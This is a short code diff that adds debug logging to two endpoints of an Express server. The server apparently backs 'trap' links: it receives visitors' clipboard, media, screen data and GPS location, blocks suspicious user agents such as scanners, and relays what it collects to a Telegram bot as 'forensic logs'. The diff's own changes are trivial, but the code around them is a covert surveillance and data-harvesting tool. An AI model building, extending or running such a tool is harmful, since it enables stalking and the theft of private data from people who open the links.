@@ -463,11 +463,13 @@ async function startServer() {
 
   // Handle Extra Data (Clipboard, Media, Screen, etc)
   app.post('/api/log/:id/extra', (req, res) => {
+    console.log(`[DEBUG] Received extra log for ${req.params.id}`);
     if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
       const data = req.body as any;
+      console.log(`[DEBUG] Extra log data keys for ${id}: ${Object.keys(data)}`);
       let extraMsg = `📎 <b>FORENSIC LOG: Advanced Modules</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n`;
       let hasTextData = false;
@@ -720,6 +722,7 @@ async function startServer() {
     res.sendStatus(200);
   });
   app.post('/api/log/:id/gps', (req, res) => {
+    console.log(`[DEBUG] Received GPS log for ${req.params.id}`);
     if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
